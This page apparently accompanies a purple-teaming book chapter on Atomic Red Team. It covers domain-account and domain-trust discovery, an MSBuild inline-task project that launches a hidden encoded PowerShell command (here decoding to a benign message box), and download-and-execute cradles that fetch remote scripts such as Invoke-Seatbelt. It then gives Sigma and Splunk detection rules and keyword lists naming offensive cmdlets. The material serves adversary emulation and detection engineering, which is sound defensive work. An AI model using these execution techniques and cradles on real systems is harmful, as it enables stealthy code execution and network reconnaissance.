---
layout: default
title: Living-off-the-Land with Atomic Red Team
tags: []
header_type       : "hero"
include_on_search : true
show_tags         : true
---


<div class="bs-component">
    <div class="progress">
        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 66.6%; background-color:#eb34e1"></div>
    </div>
</div>

## Introduction

This chapter is the first of three emulation scenarios, in which you'll familiarize yourself with open-source tools that you may leverage in your own purple teams. In this first chapter, you'll use Red Canary's Atomic Red Team to cover the initial execution and discovery activities.

<hr>

## Chapter Content

This section provides reproductions of the key figures and code snippets seen in this chapter.

#### The Attack Scenario

<figure>
<img src="/assets/images/8/scenario-0.png" style="width: 75%" title="Figure 8-1"/>
<figcaption>Figure 8-1: The initial stages of the emulation scenario</figcaption>
</figure>

#### The Atomic Red Team Test Library

##### Defining Atomics 

An example Atomic that enumerates Active Directory domain trusts using `dsquery`.

```yaml
attack_technique: T1482 
display_name: Domain Trust Discovery
atomic_tests:
- name: Windows - Discover domain trusts with dsquery
  auto_generated_guid: 4700a710-c821-4e17-a3ec-9e4c81d6845f
  description: |
    Uses the dsquery command to discover domain trusts.
    Requires the installation of dsquery via Windows RSAT or the
    Windows Server AD DS role.
  supported_platforms:
  - windows
  executor:
    command: |
      dsquery * -filter "(objectClass=trustedDomain)" -attr *
    name: command_prompt 
--snip--
```

Another <i>atomic</i> that highlights the potential for including manual steps to execute the documented test.

```yaml
attack_technique: T1176
display_name: Browser Extensions
atomic_tests:
- name: Chrome/Chromium (Developer Mode)
  auto_generated_guid: 3ecd790d-2617-4abf-9a8c-4e8d47da9ee1
  description: Turn on Chrome/Chromium developer mode and Load Extension found in the src directory
  supported_platforms:
  - linux
  - windows
  - macos
  executor:
    steps: |
      1. Navigate to [chrome://extensions](chrome://extensions) and
      tick 'Developer Mode'.

      2. Click 'Load unpacked extension...' and navigate to
      [Browser_Extension](../t1176/src/)

      3. Click 'Select'
    name: manual
--snip--
```


##### Executing Atomics with PowerShell

The download cradle to install Atomic Red Team via PowerShell and list the tests available.

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics
```

Listing tests available for a given MITRE ATT&CK technique.

```powershell
PS C:\Tools> Invoke-AtomicTest T1087.002 -ShowDetailsBrief
PathToAtomicsFolder = C:\AtomicRedTeam\atomics\

T1087.002-1 Enumerate all accounts (Domain)
T1087.002-2 Enumerate all accounts via PowerShell (Domain)
T1087.002-3 Enumerate logged on users via CMD (Domain)
T1087.002-4 Automated AD Recon (ADRecon)
T1087.002-5 Adfind - Listing password policy
T1087.002-6 Adfind - Enumerate Active Directory Admins
T1087.002-7 Adfind - Enumerate Active Directory User Objects
T1087.002-8 Adfind - Enumerate Active Directory Exchange AD Objects
T1087.002-9 Enumerate Default Domain Admin Details (Domain)
T1087.002-10 Enumerate Active Directory for Unconstrained Delegation
T1087.002-11 Get-DomainUser with PowerView
T1087.002-12 Enumerate Active Directory Users with ADSISearcher
T1087.002-13 Enumerate Linked Policies In ADSISearcher Discovery
T1087.002-14 Enumerate Root Domain linked policies Discovery
T1087.002-15 WinPwn - generaldomaininfo
T1087.002-16 Kerbrute - userenum
T1087.002-17 Wevtutil - Discover NTLM Users Remote
--snip--
```

Using the PowerShell cmdlets to list the details of an atomic.

```powershell
PS C:\Tools> Invoke-AtomicTest T1087.002-9 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics\

[********BEGIN TEST*******]
Technique: Account Discovery: Domain Account T1087.002
Atomic Test Name: Enumerate Default Domain Admin Details (Domain)
Atomic Test Number: 9
Atomic Test GUID: c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef
Description: This test will enumerate the details of the built-in domain admin account
Attack Commands:
Executor: command_prompt
ElevationRequired: False
Command:
net user administrator /domain
[!!!!!!!!END TEST!!!!!!!]
```

Finally, running an atomic for domain admin enumeration. Note, the output is included for review as well as the test metadata.

```
PS C:\Tools> Invoke-AtomicTest T1087.002-9
PathToAtomicsFolder = C:\AtomicRedTeam\atomics\

Executing test: T1087.002-9 Enumerate Default Domain Admin Details (Domain)
The request will be processed at a domain controller for domain attackrange.local.
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
--snip--
User may change password     Yes
Workstations allowed         All
Logon hours allowed          All
Local Group Memberships      *Administrators
Global Group memberships     *Schema Admins        *Enterprise Admins
                             *Domain Admins
                             *Domain Users         *Group Policy Creator
The command completed successfully.
Exit code: 0
Done executing test: T1087.002-9 Enumerate Default Domain Admin Details (Domain)
```

##### Logging

Reviewing the default Atomic Red Team log stored at `$TEMP\Invoke-AtomicTest-ExecutionLog.csv`.

```powershell
PS C:\Tools> Get-Content $ENV:TEMP\Invoke-AtomicTest-ExecutionLog.csv

"Execution Time (UTC)","Execution Time (Local)","Technique","Test Number","Test Name","Hostname","IP Address","Username","GUID","ProcessId","ExitCode"
"...","...","T1087.002","9","Enumerate Default Domain Admin Details (Domain)","ar-win-2","10.0.1.15","ar-win-2\administrator","c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef","4384","0"
```

Providing the `LoggingModule` and `ExecutionLogPath` arguments to `Invoke-AtomicTest` to use the ATTiRe log format.

```powershell
PS C:\Tools> Invoke-AtomicTest T1087.002-9 -LoggingModule 'Attire-ExecutionLogger' -ExecutionLogPath agpt-timestamp.json
```

An example log in ATTiRe format, produced by Atomic Red Team.

```json
{
  "attire-version": "1.1",
  "execution-data": {
    "execution-source": "Invoke-Atomicredteam",
    "target": {
      "user": "ar-win-2\\administrator",
      "host": "ar-win-2",
      "ip": "10.0.1.15",
      --snip--
    },
    --snip--
  },
  "procedures": [
    {
      "mitre-technique-id": "T1087.002",
      "procedure-name": "Enumerate Default Domain Admin Details (Domain)",
      "procedure-description": "This test will enumerate the details of the built-in domain admin account\n",
      "steps": [
        {
          "order": 1,
          "executor": "command_prompt",
          "command": "net user administrator /domain\n",
          "output": [
            {
          "content": "The request will be processed at a domain controller for domain attackrange.local ...", 
              "level": "STDOUT",
              "type": "console"
            }
          ],
		  --snip--
        }
      ],
      --snip--
    }
  ]
}
```

#### Creating a Binary Execution Test Case

A <i>csproj</i> file that spawns an encoded PowerShell command when executed via the `MSBuild.exe` binary.

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="BuildTarget">
  (@\wingding{1}@) <AgptPowerShell />
  </Target>
  
  <UsingTask
 (@\wingding{2}@) TaskName="AgptPowerShell"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Diagnostics;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class AgptPowerShell : Task, ITask
              {
                public override bool Execute()
                {
                  ProcessStartInfo psi = new ProcessStartInfo()
                  {
                (@\wingding{3}@) FileName = "powershell.exe",
                    Arguments = "-e QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0A YgBsAHkAIABTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAOwAgAFs AUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATQBlAHMAcwBhAG cAZQBCAG8AeABdADoAOgBTAGgAbwB3ACgAJwBNAGEAbAB3AGEAcgBlACAASQBuAHMAdABhA GwAbABlAGQAIQAnACkA",
                    UseShellExecute = false,
                    CreateNoWindow = true
                  };

                  Process.Start(psi);
                  return true;
                }
              }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Decoding the encoded PowerShell command to review its content.

```powershell
PS C:\Tools> [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYg BsAHkAIABTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAOwAgAFsA UwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATQBlAHMAcwBhAG cAZQBCAG8AeABdADoAOgBTAGgAbwB3ACgAJwBNAGEAbAB3AGEAcgBlACAASQBuAHMAdABh AGwAbABlAGQAIQAnACkA"));

Add-Type -Assembly System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Malware Installed!')
```

The command to execute the <i>csproj</i> file using `MSBuild.exe`.

```powershell
PS C:\Tools> C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\posh.csproj
```

Listing existing atomics under the MITRE technique T1127.001.

```powershell
PS C:\Tools> Invoke-AtomicTest -ShowDetailsBrief T1127.001
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

T1127.001-1 MSBuild Bypass Using Inline Tasks (C#)
T1127.001-2 MSBuild Bypass Using Inline Tasks (VB)
```

The new `atomic_tests` key added to `C:\AtomicRedTeam\atomics\T1127.001\T1127.001.yml` for the above <i>csproj</i> technique.

```yaml
attack_technique: T1127.001
display_name: 'Trusted Developer Utilities Proxy Execution: MSBuild'
atomic_tests:    
--snip--
- name: MSBuild PowerShell Execution Using Inline Tasks (C#)
  auto_generated_guid: 
  description: |
    Executes the code in a project file using msbuild.exe. This code spawns a PowerShell encoded command that displays a message box.
  supported_platforms:
  - windows
  input_arguments:
    filename:
      description: Location of the project file
      type: path
      default: PathToAtomicsFolder\T1127.001\src\psh.csproj
    msbuildpath:
      description: Default location of MSBuild
      type: path
      default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
    msbuildname:
      description: Default name of MSBuild
      type: path
      default: msbuild.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Project file must exist on disk at specified location (#{filename})
    prereq_command: |
      if (Test-Path "#{filename}") {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://aguidetopurpleteaming.com/resources/8/psh.csproj" -OutFile "#{filename}"
  executor:
    command: |
      #{msbuildpath}\#{msbuildname} "#{filename}"
    name: command_prompt
```

With the YAML file updated, the following commands list and fetch the pre-requisites for executing the atomic.

```
PS C:\Tools> Invoke-AtomicTest -CheckPrereqs  T1127.001-3
Prerequisites not met: T1127.001-3 MSBuild PowerShell Execution Using Inline Tasks (C#)
    [*] Project file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1127.001\src\psh.csproj)

Try installing prereq's with the -GetPrereqs switch

PS C:\Tools> Invoke-AtomicTest -GetPrereqs T1127.001-3
Prereq successfully met: Project file must exist on disk at specified location (C:\AtomicRedTeam\atomics\T1127.001\src\psh.csproj)
```

#### Simulating Malicious Script Execution

Executing an atomic test for T1082 that leverages PowerSharpPack to launch the SeatBelt tool for situational awareness.

```
PS C:\AtomicRedTeam> Invoke-AtomicTest T1082 -TestNames 'WinPwn - PowerSharpPack - Seatbelt' -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: System Information Discovery T1082
Atomic Test Name: WinPwn - PowerSharpPack - Seatbelt
Atomic Test Number: 23
Atomic Test GUID: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
Description: PowerSharpPack - Seatbelt technique via function of WinPwn.
[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/aguidetopurpleteaming/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command "-group=all"
[!!!!!!!!END TEST!!!!!!!]
```

A command that chains both the <i>csproj</i> atomic with the above SeatBelt atomic.

```powershell
PS C:\AtomicRedTeam> Invoke-AtomicTest T1127.001 -TestNames 'MSBuild PowerShell Execution Using Inline Tasks (C#)'; Invoke-AtomicTest T1082 -TestNames 'WinPwn - PowerSharpPack - Seatbelt';
```

#### Defending Against the Attack

##### Capturing Parent-Child Process Relationships

A good example of leveraging parent-child relationships for detecting web shells.

| Sourced from: <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/626a6fc6e3dc29b3d18155271b63465eb154d854/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml">https://github.com/SigmaHQ/sigma/blob/626a6fc6e3dc29b3d18155271b63465eb154d854/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml</a>

```yaml
title: Linux Webshell Indicators
id: 818f7b24-0fba-4c49-a073-8b755573b9c7
status: test
description: Detects suspicious sub processes of web server processes
references:
    - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
    - https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF
author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)
date: 2021/10/15
modified: 2022/12/28
tags:
    - attack.persistence
    - attack.t1505.003
logsource:
    product: linux
    category: process_creation
detection:
    selection_general:
        ParentImage|endswith:
            - '/httpd'
            - '/lighttpd'
            - '/nginx'
            - '/apache2'
            - '/node'
            - '/caddy'
    selection_tomcat:
        ParentCommandLine|contains|all:
            - '/bin/java'
            - 'tomcat'
    selection_websphere:  # ? just guessing
        ParentCommandLine|contains|all:
            - '/bin/java'
            - 'websphere'
    sub_processes:
        Image|endswith:
            - '/whoami'
            - '/ifconfig'
            - '/ip'
            - '/bin/uname'
            - '/bin/cat'
            - '/bin/crontab'
            - '/hostname'
            - '/iptables'
            - '/netstat'
            - '/pwd'
            - '/route'
    condition: 1 of selection_* and sub_processes
falsepositives:
    - Web applications that invoke Linux command line tools
level: high
```

A diagram of the parent-child relationship between `MSBuild.exe` and `powershell.exe`.

<figure>
<img src="/assets/images/8/detection-0.png" style="width: 75%" title="Figure 8-5"/>
<figcaption>Figure 8-5: The parent-child relationship between MSBuild and an encoded PowerShell command</figcaption>
</figure>

A Splunk query for evaluating the most common processes spawned by `MSBuild.exe`.

```perl
index=win
Channel="Microsoft-Windows-Sysmon/Operational"
EventID=1
ParentImage="*\\msbuild.exe"
| stats count by Image
| sort -count
```

A refined query that factors parent and child command-line arguments into the assessment of commonality.

```perl
index=win
Channel="Microsoft-Windows-Sysmon/Operational"
EventID=1
ParentImage="*\\msbuild.exe"
| stats count by ParentCommandLine, Image, CommandLine
| sort -count
```

A comparable query that leverages Windows process-tracking audit logs (event ID 4688) rather than Sysmon logs.

```perl
index=win
Channel=Security
EventID=4688
ParentProcessName="*\\msbuild.exe"
| stats count by NewProcessName
| sort -count
```

##### Creating Splunk Alerts

A Splunk SPL query that detects instances of `MSBuild.exe` spawning `powershell.exe`.

```perl
index=win
Channel="Microsoft-Windows-Sysmon/Operational"
EventID=1
ParentImage="*\\msbuild.exe"
Image="*\\powershell.exe"
```

##### Viewing Suspicious Script Content

Splunk SPL that stitches PowerShell Script Block logging entries together to view entire scripts

```perl
index=win
Channel="Microsoft-Windows-PowerShell/Operational"
EventID=4104
| sort 0 ScriptBlockId, MessageNumber
| stats list(ScriptBlockText) as Script, min(_time) as _time, first(Computer) as Computer by ScriptBlockId
| eval Script=mvjoin(Script, "")
| search Script=*seatbelt*
| table _time, Computer, ScriptBlockId, Script
```

A Splunk query that looks for suspicious names of PowerShell cmdlets in Script Block logs.

```perl
index=win
Channel="Microsoft-Windows-PowerShell/Operational"
EventID=4104
ScriptBlockText IN (
    "*Invoke-Seatbelt*",
    "*Invoke-PPLDump*",
    "*Invoke-Rubeus*",
    "*Invoke-SCShell*",
    "*Invoke-SafetyKatz*",
    "*Invoke-SharpGPOAbuse*",
    --snip--
)
```

A similar query based on [this Sigma rule](https://github.com/SigmaHQ/sigma/blob/1a85bc5b5a88253a35e63e23cf603090d93d59c4/rules/windows/powershell/powershell_script/posh_ps_susp_keywords.yml) that looks for suspicious PowerShell functions being used for .NET reflection.

```perl
index=win
Channel="Microsoft-Windows-PowerShell/Operational"
EventID=4104
ScriptBlockText IN (
    "*System.Reflection.Assembly.Load($*",
    "*[System.Reflection.Assembly]::Load($*",
    "*[Reflection.Assembly]::Load($*",
    "*System.Reflection.AssemblyName*",
    --snip--
)
```

<hr>

## Resources

The following resources expand on topics covered in this chapter.
<br/>
<br/>



#### Living-off-the-Land Attacks
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A community-supported library of Windows Living Off The Land binaries and scripts</h6>
                <p><i>"LOLBAS," accessed May 6, 2024</i></p>
                <a target="_blank" href="https://lolbas-project.github.io/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A Linux-focused library of Living Off The Land techniques</h6>
                <p><i>"GTFOBins," accessed May 6, 2024</i></p>
                <a target="_blank" href="https://gtfobins.github.io/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A library of Living Off The Land techniques targeting the Apple macOS operating system</h6>
                <p><i>"LOOBins," accessed May 6, 2024</i></p>
                <a target="_blank" href="https://www.loobins.io/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An example of DarkGate malware abusing AutoHotKey and Windows LOLBAS to achieve infection</h6>
                <p><i>"delivr.to," accessed May 6, 2024</i></p>
                <a target="_blank" href="https://delivr.to/?id=e3d89f22-df99-4693-b788-03022288ec43" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Capturing Parent-Child Process Relationships
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A Sigma rule for the detection of suspicious child process spawning from Linux web server parent processes</h6>
                <p><i>"proc_creation_lnx_webshell_detection," accessed October 06, 2024</i></p>
                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/626a6fc6e3dc29b3d18155271b63465eb154d854/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Various techniques for operating in an EDR-monitored environment including spoofing parent process IDs and command line arguments, notably thwarting detections based on parent-child relationships</h6>
                <p><i>William Burgess, "Red teaming in an EDR age," Wild West Hacking Fest, November 2018</i></p>
                <a target="_blank" href="https://youtu.be/l8nkXCOYQC4" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Detection of parent process ID spoofing using Event Tracing for Windows</h6>
                <p><i>Noora Hyvärinen, "Detecting Parent PID Spoofing," F-Secure, December 21, 2018</i></p>
                <a target="_blank" href="https://blog.f-secure.com/detecting-parent-pid-spoofing/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Viewing Suspicious Script Content
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A Sigma rule for the detection of suspicious PowerShell cmdlets, including those relating to .NET reflection</h6>
                <p><i>"posh_ps_susp_keywords," accessed October 06, 2024</i></p>
                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/1a85bc5b5a88253a35e63e23cf603090d93d59c4/rules/windows/powershell/powershell_script/posh_ps_susp_keywords.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Bypassing Script Block Logging and suspicious strings</h6>
                <p><i>Adam Chester, "Exploring PowerShell AMSI and Logging Evasion," MDSec, June, 2018</i></p>
                <a target="_blank" href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>More examples of hunting for suspicious content in Script Block Logging output</h6>
                <p><i>Splunk Threat Research Team, "Hunting for Malicious PowerShell using Script Block Logging," Splunk, September 17, 2021</i></p>
                <a target="_blank" href="https://www.splunk.com/en_us/blog/security/hunting-for-malicious-powershell-using-script-block-logging.html" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Going Beyond
<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Executing attacks with Leonidas and purple teaming environments to develop attack detection capability</h6>
                <p><i>Alfie Champion and Nick Jones, "Beyond Public Buckets: Lessons Learned on Attack Detection in the Cloud," RSA Conference, May, 2021</i></p>
                <a target="_blank" href="https://youtu.be/YvpzUpOsY7c" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Performing purple team exercises targeting Kubernetes infrastructure using Leonidas</h6>
                <p><i>Leo Tsaousis, "DEF CON 32 - Kubernetes Attack Simulation: The Definitive Guide," Def Con 32, accessed November 22, 2024</i></p>
                <a target="_blank" href="https://www.youtube.com/watch?v=PFeqxSD7Gh8" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The release blog for Stratus Red Team, outlining functionality and design philosophy</h6>
                <p><i>Christophe Tafani-Dereeper, "Introducing Stratus Red Team, an Adversary Emulation Tool for the Cloud," January 28, 2022</i></p>
                <a target="_blank" href="https://blog.christophetd.fr/introducing-stratus-red-team-an-adversary-emulation-tool-for-the-cloud/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>



<div class="container">
  <div class="row">
    <div class="col" style="text-align: left">
      <a href="/part-II/network-traffic-and-event-tracing/" class="btn btn-primary"><< Chapter 7</a>
    </div>
    <div class="col" style="text-align: right">
      <a href="/part-II/ad-recon-with-mitre-caldera/" class="btn btn-primary">Chapter 9 >></a>
    </div>
  </div>
</div>